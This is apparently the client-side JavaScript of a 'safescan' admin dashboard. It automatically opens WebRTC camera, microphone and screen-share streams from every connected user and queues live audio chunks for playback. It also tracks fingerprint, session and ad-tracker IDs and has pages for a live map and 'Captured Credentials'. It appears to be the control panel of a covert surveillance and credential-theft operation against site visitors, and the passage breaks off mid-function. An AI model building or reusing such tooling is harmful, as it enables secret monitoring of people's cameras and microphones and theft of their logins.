
// ═══════════════════════════════════════════════════════════════════
// CONFIG & STATE
// ═══════════════════════════════════════════════════════════════════
const API = (function() {
    // Local file system
    if (window.location.origin.startsWith('file:')) return 'http://localhost:3001';
    // Production / hosted (Render, etc.) — use same origin
    const host = window.location.hostname;
    if (host !== 'localhost' && host !== '127.0.0.1') return window.location.origin;
    // Local dev on different port (e.g. Live Server on 5500)
    if (window.location.port !== '3001') return `http://${host}:3001`;
    // Local Express server on 3001
    return window.location.origin;
})();
const TOKEN = localStorage.getItem('safescan_token');
const ADMIN = JSON.parse(localStorage.getItem('safescan_admin') || '{}');

if (!TOKEN || TOKEN === 'undefined' || TOKEN === 'null') {
    localStorage.clear();
    window.location.href = '/admin/';
}

// Set admin avatar
document.getElementById('adminAvatar').textContent = (ADMIN.name || 'A').charAt(0).toUpperCase();
document.getElementById('settingsUsername').value = ADMIN.email || '';

// State
let allUsers = {};       // uuid -> user data
let latestFrames = {};   // uuid -> image url
let currentGrid = 3;
let currentAudio = null; // currently playing audio element

// ═══════════════════════════════════════════════════════════════════
// API HELPERS
// ═══════════════════════════════════════════════════════════════════
async function api(endpoint, opts = {}) {
    const res = await fetch(API + endpoint, {
        ...opts,
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + TOKEN, ...(opts.headers || {}) }
    });
    if (res.status === 401) { localStorage.clear(); window.location.href = '/admin/'; return; }
    return res.json();
}

function timeAgo(dateStr) {
    const diff = (Date.now() - new Date(dateStr).getTime()) / 1000;
    if (diff < 60) return 'Just now';
    if (diff < 3600) return Math.floor(diff/60) + 'm ago';
    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
    return Math.floor(diff/86400) + 'd ago';
}

function fmtDuration(s) {
    s = Math.floor(s || 0);
    return Math.floor(s/60) + ':' + String(s%60).padStart(2,'0');
}

function truncUUID(u, n) { return (u||'').substring(0, n||8); }

// ═══════════════════════════════════════════════════════════════════
// SOCKET.IO CONNECTION
// ═══════════════════════════════════════════════════════════════════
const socket = io(API, {
    auth: { token: TOKEN },
    transports: ['websocket', 'polling'],
    reconnection: true,
    reconnectionDelay: 3000
});

socket.on('connect', () => {
    document.getElementById('connDot').className = 'connection-dot on';
    document.getElementById('connText').textContent = 'Connected';
    socket.emit('admin:join');
});

socket.on('disconnect', () => {
    document.getElementById('connDot').className = 'connection-dot off';
    document.getElementById('connText').textContent = 'Disconnected';
});

socket.on('connect_error', (err) => {
    console.error('[Socket] Connection error:', err.message);
    document.getElementById('connDot').className = 'connection-dot off';
    document.getElementById('connText').textContent = 'Error: ' + err.message;
});

socket.on('auth:error', (data) => {
    console.error('[Socket] Auth error:', data.error);
    document.getElementById('connText').textContent = 'Auth Error';
    localStorage.clear();
    setTimeout(() => {
        window.location.href = '/admin/';
    }, 2000);
});

// Init
    if (ADMIN.role === 'Viewer') {
        const style = document.createElement('style');
        style.innerHTML = '.btn-delete, .rec-btn-delete { display: none !important; }';
        document.head.appendChild(style);
    }
socket.on('admin:users', (users) => {
    users.forEach(u => {
        allUsers[u.uuid] = { ...u, is_online: true };
    });
    renderFeedGrid();
});

// User connected
socket.on('user:connected', (user) => {
    allUsers[user.uuid] = { ...user, is_online: true };
    renderFeedGrid();
    addNotification('🟢', 'User ' + truncUUID(user.uuid) + ' connected');
});

// User disconnected
socket.on('user:disconnected', (data) => {
    if (allUsers[data.uuid]) {
        allUsers[data.uuid].is_online = false;
    }
    if (activeStreamUser === data.uuid) {
        stopLiveStream();
        const controls = document.getElementById('modalStreamControls');
        if (controls) controls.style.display = 'none';
        const badge = document.getElementById('modalBadge');
        if (badge) badge.innerHTML = '<span class="badge-offline">OFFLINE</span>';
    }
    renderFeedGrid();
    addNotification('🔴', 'User ' + truncUUID(data.uuid) + ' disconnected');
});

// New camera frame (live base64)
socket.on('feed:frame', (data) => {
    const src = data.frame || (data.imageUrl ? API + data.imageUrl : null);
    if (!src) return;
    latestFrames[data.uuid] = src;
    const img = document.getElementById('feed-img-' + data.uuid);
    if (img) {
        img.src = src;
        img.style.display = 'block';
        const ph = document.getElementById('feed-ph-' + data.uuid);
        if (ph) ph.style.display = 'none';
    }
    addNotification('📸', 'New capture from ' + truncUUID(data.uuid));
});

// New audio recording
socket.on('feed:audio', (data) => {
    const toast = document.getElementById('audioToast');
    document.getElementById('toastMsg').textContent = `New recording from ${truncUUID(data.uuid)} — ${fmtDuration(data.duration)}`;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 4000);
    addNotification('🎤', 'New recording from ' + truncUUID(data.uuid));
});

// Stats
socket.on('stats:update', (s) => {
    document.getElementById('statOnline').textContent = s.onlineCount;
    document.getElementById('statCaptures').textContent = s.totalCaptures;
    document.getElementById('statRecordings').textContent = s.totalRecordings;
    if (document.getElementById('statTotalUsers')) document.getElementById('statTotalUsers').textContent = s.totalUsers;
});

// WebRTC Signaling Listeners
socket.on('webrtc:offer', async (data) => {
    console.log('[WebRTC] Received offer from user:', data.uuid);
    
    let conn = activeConnections[data.uuid];
    if (!conn) {
        activeConnections[data.uuid] = {
            pc: null,
            socketId: data.userSocketId,
            isMuted: true,
            stream: null
        };
        conn = activeConnections[data.uuid];
    }
    
    conn.socketId = data.userSocketId;
    
    if (conn.pc) {
        conn.pc.close();
    }
    
    const pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });
    conn.pc = pc;

    pc.ontrack = (event) => {
        console.log('[WebRTC] Received remote track for user:', data.uuid, event.track.kind);
        conn.stream = event.streams[0]; // Save remote stream reference
        const video = document.getElementById(`feed-vid-${data.uuid}`);
        const img = document.getElementById(`feed-img-${data.uuid}`);
        const ph = document.getElementById(`feed-ph-${data.uuid}`);
        
        if (ph) ph.style.display = 'none';
        if (img) img.style.display = 'none';
        if (video) {
            video.style.display = 'block';
            if (video.srcObject !== event.streams[0]) {
                video.srcObject = event.streams[0];
                video.play().catch(err => console.log('Video play error:', err));
                video.muted = conn.isMuted;
            }
        }
        
        // Handle Screen Share routing
        if (activeScreenShareUser === data.uuid) {
            const screenVideo = document.getElementById('modalScreenVideo');
            const screenLoading = document.getElementById('screenShareLoading');
            if (screenVideo) {
                screenVideo.srcObject = event.streams[0];
                screenVideo.style.display = 'block';
                screenVideo.play().catch(e => {});
            }
            if (screenLoading) screenLoading.style.display = 'none';
        }
        
        // Mirror to modal if currently active user
        if (activeStreamUser === data.uuid) {
            const modalVideo = document.getElementById('modalLiveVideo');
            const modalImg = document.getElementById('modalCaptureImage');
            const overlay = document.getElementById('modalStreamOverlay');
            
            if (modalImg) modalImg.style.display = 'none';
            if (modalVideo) {
                modalVideo.style.display = 'block';
                if (modalVideo.srcObject !== event.streams[0]) {
                    modalVideo.srcObject = event.streams[0];
                    modalVideo.muted = conn.isMuted;
                    modalVideo.play().catch(e => {});
                }
            }
            if (overlay) {
                overlay.style.display = 'flex';
                document.getElementById('modalStreamStatusText').textContent = 'LIVE';
            }
            
            const startBtn = document.getElementById('startStreamBtn');
            const stopBtn = document.getElementById('stopStreamBtn');
            if (startBtn) startBtn.style.display = 'none';
            if (stopBtn) {
                stopBtn.style.display = 'block';
                stopBtn.textContent = conn.isMuted ? '🔊 Unmute Voice' : '🔇 Mute Voice';
            }
        }
    };

    pc.onicecandidate = (event) => {
        if (event.candidate && socket && socket.connected) {
            socket.emit('webrtc:ice-candidate', {
                userSocketId: conn.socketId,
                candidate: event.candidate
            });
        }
    };

    try {
        await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        
        socket.emit('webrtc:answer', {
            userSocketId: conn.socketId,
            answer: answer
        });
    } catch (e) {
        console.error('[WebRTC] Error processing offer:', e);
    }
});

socket.on('webrtc:ice-candidate', async (data) => {
    const conn = activeConnections[data.uuid];
    if (conn && conn.pc) {
        try {
            await conn.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
        } catch (e) {
            console.error('[WebRTC] Error adding ICE candidate:', e);
        }
    }
});

// ═══════════════════════════════════════════════════════════════════
// LIVE AUDIO PLAYBACK
// ═══════════════════════════════════════════════════════════════════
let listeningTo = null; // UUID of user we're listening to
let audioQueue = [];    // queue of audio blob URLs
let isPlaying = false;

function toggleListen(uuid, event) {
    event.stopPropagation();
    const btn = event.currentTarget;
    if (listeningTo === uuid) {
        // Stop listening
        listeningTo = null;
        btn.classList.remove('active');
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg>';
        audioQueue = [];
        isPlaying = false;
    } else {
        // Stop previous listener
        const prevBtn = document.querySelector('.listen-btn.active');
        if (prevBtn) { prevBtn.classList.remove('active'); prevBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg>'; }
        listeningTo = uuid;
        btn.classList.add('active');
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path><path d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg>';
        audioQueue = [];
        isPlaying = false;
    }
}

function playNextChunk() {
    if (audioQueue.length === 0) { isPlaying = false; return; }
    isPlaying = true;
    const url = audioQueue.shift();
    const audio = new Audio(url);
    audio.onended = () => { URL.revokeObjectURL(url); playNextChunk(); };
    audio.onerror = () => { URL.revokeObjectURL(url); playNextChunk(); };
    audio.play().catch(() => { URL.revokeObjectURL(url); playNextChunk(); });
}

// Receive live audio chunks
socket.on('feed:audio:live', (data) => {
    if (data.uuid !== listeningTo) return;
    try {
        const base64 = data.chunk.split(',')[1];
        const binary = atob(base64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        const blob = new Blob([bytes], { type: data.mimeType || 'audio/webm' });
        const url = URL.createObjectURL(blob);
        audioQueue.push(url);
        if (!isPlaying) playNextChunk();
    } catch (e) {
        console.error('Audio chunk error:', e);
    }
});

// ═══════════════════════════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════════════════════════
function showPage(page) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('page-' + page).classList.add('active');
    document.querySelector(`.nav-item[data-page="${page}"]`).classList.add('active');

    const titles = { feeds: 'Live Feeds', users: 'Users', recordings: 'Recordings', settings: 'Settings', analytics: 'Analytics', captures: 'Captures Gallery', activity: 'Activity Log', map: 'Live Map', files: 'Files', credentials: 'Captured Credentials' , admins: 'Admins' };
    document.getElementById('pageTitle').textContent = titles[page];

    if (page === 'users') loadUsers();
    if (page === 'admins') loadAdmins();
    if (page === 'recordings') loadRecordings();
    if (page === 'feeds') renderFeedGrid();
    if (page === 'analytics') loadAnalytics();
    if (page === 'captures') loadCapturesGallery();
    if (page === 'activity') loadActivityLog();
    if (page === 'map') initMap();
    if (page === 'files') loadFiles();
    if (page === 'credentials') loadCredentials();

    closeSidebar();
}

function doLogout() {
    localStorage.clear();
    window.location.href = '/admin/';
}

// Mobile sidebar controls
function toggleSidebar(e) {
    if (e) e.stopPropagation();
    document.querySelector('.sidebar').classList.toggle('open');
    document.getElementById('sidebarBackdrop').classList.toggle('show');
}

function closeSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const backdrop = document.getElementById('sidebarBackdrop');
    if (sidebar) sidebar.classList.remove('open');
    if (backdrop) backdrop.classList.remove('show');
}

// ═══════════════════════════════════════════════════════════════════
// LIVE FEED GRID
// ═══════════════════════════════════════════════════════════════════
function setGrid(n) {
    currentGrid = n;
    document.querySelectorAll('.grid-btn').forEach(b => b.classList.remove('active'));
    event.target.classList.add('active');
    const grid = document.getElementById('feedGrid');
    grid.className = 'feed-grid g' + n;
}

function renderFeedGrid() {
    const grid = document.getElementById('feedGrid');
    const empty = document.getElementById('emptyState');
    const users = Object.values(allUsers);

    // Sort: online first
    users.sort((a, b) => (b.is_online ? 1 : 0) - (a.is_online ? 1 : 0));

    document.getElementById('feedCount').textContent = users.length;

    if (users.length === 0) {
        grid.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }

    empty.style.display = 'none';

    // Build a set of current user UUIDs for cleanup
    const currentUUIDs = new Set(users.map(u => u.uuid));

    // Remove cards for users that no longer exist
    grid.querySelectorAll('.feed-card').forEach(card => {
        const cardUUID = card.id.replace('feed-card-', '');
        if (!currentUUIDs.has(cardUUID)) {
            card.remove();
        }
    });

    // Add or update each user's card
    users.forEach(u => {
        const frame = latestFrames[u.uuid];
        const online = u.is_online;
        let card = document.getElementById('feed-card-' + u.uuid);

        if (!card) {
            // Create new card — this user doesn't have one yet
            card = document.createElement('div');
            card.className = 'feed-card glass' + (online ? ' online' : '');
            card.id = 'feed-card-' + u.uuid;
            card.innerHTML = buildCardInner(u, frame, online);
            grid.appendChild(card);
        } else {
            // Update existing card WITHOUT destroying video elements
            card.className = 'feed-card glass' + (online ? ' online' : '');

            // Update overlay badges
            const overlay = card.querySelector('.feed-overlay');
            if (overlay) {
                overlay.innerHTML = (online
                    ? '<span class="badge-live"><span class="live-dot"></span> LIVE</span>'
                    : '<span class="badge-offline">OFFLINE</span>')
                    + '<span class="badge-uuid">' + truncUUID(u.uuid) + '</span>';
            }

            // Update static image visibility (only if no active WebRTC stream)
            const img = document.getElementById('feed-img-' + u.uuid);
            const ph = document.getElementById('feed-ph-' + u.uuid);
            const vid = document.getElementById('feed-vid-' + u.uuid);

            // Check if this user has an active WebRTC stream on their video element
            const hasActiveStream = vid && vid.srcObject && vid.srcObject.active;

            if (hasActiveStream && online) {
                // WebRTC is active — keep video visible, hide others
                if (vid) vid.style.display = 'block';
                if (img) img.style.display = 'none';
                if (ph) ph.style.display = 'none';
            } else if (frame && !online) {
                if (img) { img.src = frame; img.style.display = 'block'; }
                if (ph) ph.style.display = 'none';
                if (vid) { vid.style.display = 'none'; vid.srcObject = null; }
            } else if (!frame && !online) {
                if (img) img.style.display = 'none';
                if (ph) ph.style.display = 'flex';
                if (vid) { vid.style.display = 'none'; vid.srcObject = null; }
            } else if (online && !hasActiveStream) {
                // Online but WebRTC not connected yet — show video element (will be black until stream arrives)
                if (vid) vid.style.display = 'block';
                if (img) img.style.display = 'none';
                if (ph) ph.style.display = 'none';
            }

            // Update/add/remove speaker button
            let speakerBtn = document.getElementById('feed-speaker-' + u.uuid);
            if (online && !speakerBtn) {
                const wrap = card.querySelector('.feed-img-wrap');
                if (wrap) {
                    speakerBtn = document.createElement('button');
                    speakerBtn.className = 'listen-btn';
                    speakerBtn.id = 'feed-speaker-' + u.uuid;
                    speakerBtn.onclick = function(e) { toggleMute(u.uuid, e); };
                    speakerBtn.title = 'Unmute Voice';
                    speakerBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M9 9v6a3 3 0 0 0 3 3h1.586l4.707 4.707A1 1 0 0 0 20 22V4a1 1 0 0 0-1.707-.707L13.586 8H12a3 3 0 0 0-3 1z"></path></svg>';
                    wrap.appendChild(speakerBtn);
                }
            } else if (!online && speakerBtn) {
                speakerBtn.remove();
            }

            // Update info section
            const meta = card.querySelector('.feed-meta');
            if (meta) {
                meta.innerHTML = '<span>' + (u.device_type || 'Unknown') + '</span><span>' + timeAgo(u.last_active) + '</span>';
            }
            const counts = card.querySelector('.feed-counts');
            if (counts) {
                counts.innerHTML = '<span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>' + (u.captures_count || 0) + '</span>'
                    + '<span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/></svg>' + (u.recordings_count || 0) + '</span>';
            }
        }
    });

    // Reorder cards in DOM to match sorted order (online first) without destroying them
    users.forEach(u => {
        const card = document.getElementById('feed-card-' + u.uuid);
        if (card) grid.appendChild(card); // moves existing node to end in sorted order
    });

    // After DOM update, trigger WebRTC streams for all online users
    autoConnectStreams();
}

// Helper: build inner HTML for a brand new feed card
function buildCardInner(u, frame, online) {
    return '<div class="feed-img-wrap" style="position:relative; cursor:pointer;" onclick="triggerLightbox(\'' + u.uuid + '\', event)" title="Click to view big screen">'
        + '<img class="feed-img" id="feed-img-' + u.uuid + '" src="' + (frame || '') + '" alt="" style="display:' + (frame && !online ? 'block' : 'none') + '; width:100%; height:100%; object-fit:cover;">'
        + '<div class="feed-placeholder" id="feed-ph-' + u.uuid + '" style="display:' + (!frame && !online ? 'flex' : 'none') + ';">'
        + '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>'
        + '</div>'
        + '<video class="feed-video" id="feed-vid-' + u.uuid + '" autoplay playsinline muted style="display:' + (online ? 'block' : 'none') + '; width:100%; height:100%; object-fit:cover; background:#000;"></video>'
        + '<div class="feed-overlay">'
        + (online ? '<span class="badge-live"><span class="live-dot"></span> LIVE</span>' : '<span class="badge-offline">OFFLINE</span>')
        + '<span class="badge-uuid">' + truncUUID(u.uuid) + '</span>'
        + '</div>'
        + (online ? '<button class="listen-btn" id="feed-speaker-' + u.uuid + '" onclick="toggleMute(\'' + u.uuid + '\', event)" title="Unmute Voice"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M9 9v6a3 3 0 0 0 3 3h1.586l4.707 4.707A1 1 0 0 0 20 22V4a1 1 0 0 0-1.707-.707L13.586 8H12a3 3 0 0 0-3 1z"></path></svg></button>' : '')
        + '</div>'
        + '<div class="feed-info" style="cursor:pointer;" onclick="openUserModal(\'' + u.uuid + '\')" title="Click to view details">'
        + '<div class="feed-meta"><span>' + (u.device_type || 'Unknown') + '</span><span>' + timeAgo(u.last_active) + '</span></div>'
        + '<div class="feed-counts">'
        + '<span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>' + (u.captures_count || 0) + '</span>'
        + '<span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/></svg>' + (u.recordings_count || 0) + '</span>'
        + '</div></div>';
}

// Load users from API for initial data
async function loadInitialUsers() {
    try {
        const data = await api('/api/users');
        if (data && data.users) {
            data.users.forEach(u => {
                allUsers[u.uuid] = u;
            });
            renderFeedGrid();
        }
    } catch(e) {}
}
loadInitialUsers();

// ═══════════════════════════════════════════════════════════════════
// USER MODAL & WEBRTC LIVE STREAMING
// ═══════════════════════════════════════════════════════════════════
const activeConnections = {}; // uuid -> { pc, socketId, isMuted }
let activeStreamUser = null;

// Automatically negotiate WebRTC for all online users
function autoConnectStreams() {
    Object.values(allUsers).forEach(u => {
        if (u.is_online) {
            // If connection already exists, re-attach stream to video element (in case DOM was recreated for new card)
            const conn = activeConnections[u.uuid];
            if (conn && conn.pc) {
                const video = document.getElementById('feed-vid-' + u.uuid);
                if (video && !video.srcObject) {
                    if (conn.stream) {
                        video.srcObject = conn.stream;
                        video.muted = conn.isMuted;
                        video.play().catch(e => {});
                        video.style.display = 'block';
                        const img = document.getElementById('feed-img-' + u.uuid);
                        const ph = document.getElementById('feed-ph-' + u.uuid);
                        if (img) img.style.display = 'none';
                        if (ph) ph.style.display = 'none';
                    } else {
                        // Fallback: Re-attach the existing stream from the peer connection receivers
                        const receivers = conn.pc.getReceivers();
                        if (receivers.length > 0) {
                            const streams = [];
                            receivers.forEach(r => {
                                if (r.track) streams.push(r.track);
                            });
                            if (streams.length > 0) {
                                const newMs = new MediaStream(streams);
                                conn.stream = newMs; // cache it
                                video.srcObject = newMs;
                                video.muted = conn.isMuted;
                                video.play().catch(e => {});
                                video.style.display = 'block';
                                const img = document.getElementById('feed-img-' + u.uuid);
                                const ph = document.getElementById('feed-ph-' + u.uuid);
                                if (img) img.style.display = 'none';
                                if (ph) ph.style.display = 'none';
                            }
                        }
                    }
                }
            } else {
                initiateWebRTCForUser(u.uuid);
            }
        } else {
            closeWebRTCConnection(u.uuid);
        }
    });
}

function initiateWebRTCForUser(uuid) {
    if (activeConnections[uuid]) return;
    
    console.log('[WebRTC] Initiating auto-connection for user:', uuid);
    activeConnections[uuid] = {
        pc: null,
        socketId: null,
        isMuted: true // Muted by default
    };
    
    socket.emit('webrtc:request', { uuid: uuid });
}

function closeWebRTCConnection(uuid) {
    const conn = activeConnections[uuid];
    if (!conn) return;
    
    console.log('[WebRTC] Cleaning up connection for user:', uuid);
    if (conn.pc) {
        try { conn.pc.close(); } catch(e) {}
    }
    if (socket && socket.connected && conn.socketId) {
        socket.emit('webrtc:stop', { userSocketId: conn.socketId });
    }
    delete activeConnections[uuid];
}

function toggleMute(uuid, event) {
    if (event) event.stopPropagation();
    
    const conn = activeConnections[uuid];
    if (!conn) return;
    
    const video = document.getElementById(`feed-vid-${uuid}`);
    const btn = document.getElementById(`feed-speaker-${uuid}`);
    if (!video) return;
    
    conn.isMuted = !conn.isMuted;
    video.muted = conn.isMuted;
    
    if (btn) {
        if (conn.isMuted) {
            btn.classList.remove('active');
            btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M9 9v6a3 3 0 0 0 3 3h1.586l4.707 4.707A1 1 0 0 0 20 22V4a1 1 0 0 0-1.707-.707L13.586 8H12a3 3 0 0 0-3 1z"></path></svg>`;
            btn.title = "Unmute Voice";
        } else {
            btn.classList.add('active');
            btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path><path d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg>`;
            btn.title = "Mute Voice";
        }
    }
}

let activeLightboxUser = null;

function triggerLightbox(uuid, event) {
    if (event) event.stopPropagation();
    const u = allUsers[uuid];
    if (!u) return;

    activeLightboxUser = uuid;
    const lightbox = document.getElementById('videoLightbox');
    const lVideo = document.getElementById('lightboxVideo');
    const lImg = document.getElementById('lightboxImg');
    const lUuid = document.getElementById('lightboxUuid');
    const lBadge = document.getElementById('lightboxBadge');
    
    lUuid.textContent = u.uuid;
    lBadge.innerHTML = u.is_online
        ? '<span class="badge-live"><span class="live-dot"></span> LIVE</span>'
        : '<span class="badge-offline">OFFLINE</span>';

    if (u.is_online) {
        lImg.style.display = 'none';
        lVideo.style.display = 'block';
        
        const gridVideo = document.getElementById(`feed-vid-${uuid}`);
        if (gridVideo && gridVideo.srcObject) {
            lVideo.srcObject = gridVideo.srcObject;
            const conn = activeConnections[uuid];
            lVideo.muted = conn ? conn.isMuted : true;
            lVideo.play().catch(e => {});
            
            updateLightboxSpeaker(conn ? conn.isMuted : true);
        }
    } else {
        lVideo.style.display = 'none';
        lVideo.srcObject = null;
        lImg.style.display = 'block';
        const frame = latestFrames[uuid];
        lImg.src = frame || '';
        document.getElementById('lightboxSpeaker').style.display = 'none';
    }

    lightbox.classList.add('show');
}

function closeLightbox(event) {
    if (event) event.stopPropagation();
    const lightbox = document.getElementById('videoLightbox');
    const lVideo = document.getElementById('lightboxVideo');
    if (lVideo) lVideo.srcObject = null;
    activeLightboxUser = null;
    lightbox.classList.remove('show');
}

function toggleLightboxMute(event) {
    if (event) event.stopPropagation();
    if (!activeLightboxUser) return;
    
    toggleMute(activeLightboxUser);
    
    const conn = activeConnections[activeLightboxUser];
    if (conn) {
        const lVideo = document.getElementById('lightboxVideo');
        if (lVideo) lVideo.muted = conn.isMuted;
        updateLightboxSpeaker(conn.isMuted);
    }
}

function updateLightboxSpeaker(isMuted) {
    const btn = document.getElementById('lightboxSpeaker');
    btn.style.display = 'flex';
    if (isMuted) {
        btn.className = 'glass-btn';
        btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M9 9v6a3 3 0 0 0 3 3h1.586l4.707 4.707A1 1 0 0 0 20 22V4a1 1 0 0 0-1.707-.707L13.586 8H12a3 3 0 0 0-3 1z"></path></svg> Unmute Voice`;
    } else {
        btn.className = 'glass-btn active';
        btn.style.background = 'rgba(34,197,94,0.15)';
        btn.style.borderColor = 'rgba(34,197,94,0.3)';
        btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path><path d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg> Mute Voice`;
    }
}

function openUserModal(uuid) {
    const u = allUsers[uuid];
    if (!u) return;

    activeStreamUser = uuid;

    const frame = latestFrames[uuid];
    const badge = document.getElementById('modalBadge');
    badge.innerHTML = u.is_online
        ? '<span class="badge-live"><span class="live-dot"></span> LIVE</span>'
        : '<span class="badge-offline">OFFLINE</span>';
    
    document.getElementById('modalUuid').textContent = u.uuid;
    
    // Set static frame
    const img = document.getElementById('modalCaptureImage');
    if (frame) {
        if (img) {
            img.src = frame;
            img.style.display = 'block';
        }
    } else {
        if (img) img.style.display = 'none';
    }

    // Mirror live video from the grid
    const modalVideo = document.getElementById('modalLiveVideo');
    const gridVideo = document.getElementById(`feed-vid-${uuid}`);
    const overlay = document.getElementById('modalStreamOverlay');
    const controls = document.getElementById('modalStreamControls');
    
    if (u.is_online) {
        if (controls) controls.style.display = 'block';
        
        // Mirror the grid video stream if active
        if (gridVideo && gridVideo.srcObject) {
            if (modalVideo) {
                modalVideo.srcObject = gridVideo.srcObject;
                modalVideo.style.display = 'block';
                const conn = activeConnections[uuid];
                modalVideo.muted = conn ? conn.isMuted : true;
                modalVideo.play().catch(e => {});
            }
            if (img) img.style.display = 'none';
            if (overlay) {
                overlay.style.display = 'flex';
                document.getElementById('modalStreamStatusText').textContent = 'LIVE';
            }
            
            // Set modal button states
            document.getElementById('startStreamBtn').style.display = 'none';
            document.getElementById('stopStreamBtn').style.display = 'block';
            document.getElementById('stopStreamBtn').textContent = (conn && !conn.isMuted) ? '🔇 Mute Voice' : '🔊 Unmute Voice';
        } else {
            // Stream not connected yet
            if (modalVideo) {
                modalVideo.style.display = 'none';
                modalVideo.srcObject = null;
            }
            if (overlay) overlay.style.display = 'none';
            document.getElementById('startStreamBtn').style.display = 'block';
            document.getElementById('stopStreamBtn').style.display = 'none';
        }
    } else {
        if (controls) controls.style.display = 'none';
        if (modalVideo) {
            modalVideo.style.display = 'none';
            modalVideo.srcObject = null;
        }
        if (overlay) overlay.style.display = 'none';
    }

    // Set details
    document.getElementById('modalDeviceVal').textContent = u.device_type || '—';
    document.getElementById('modalBrowserVal').textContent = u.browser || '—';
    document.getElementById('modalCountryVal').textContent = u.country || '—';
    document.getElementById('modalLastActiveVal').textContent = timeAgo(u.last_active);
    document.getElementById('modalCapturesVal').textContent = u.captures_count || 0;
    document.getElementById('modalRecordingsVal').textContent = u.recordings_count || 0;

    // Populate all session IDs
    const sids = u.session_ids || {};
    document.getElementById('sid_cookie').textContent = sids.cookie_session_id || '—';
    document.getElementById('sid_tab').textContent = sids.tab_session_id || '—';
    document.getElementById('sid_page').textContent = sids.page_load_id || '—';
    document.getElementById('sid_socket').textContent = sids.socket_id || '—';
    document.getElementById('sid_fingerprint').textContent = sids.fingerprint_id || '—';
    document.getElementById('sid_localstorage').textContent = sids.local_storage_id || '—';
    document.getElementById('sid_engineio').textContent = sids.engine_io_id || '—';
    // Reset panel to collapsed
    document.getElementById('sessionIdsPanel').style.display = 'none';

    // Populate Tracking IDs
    const tids = u.third_party_ids || {};
    document.getElementById('trk_ga').textContent = tids.ga_client_id || '—';
    document.getElementById('trk_fb').textContent = tids.fb_pixel_id || '—';
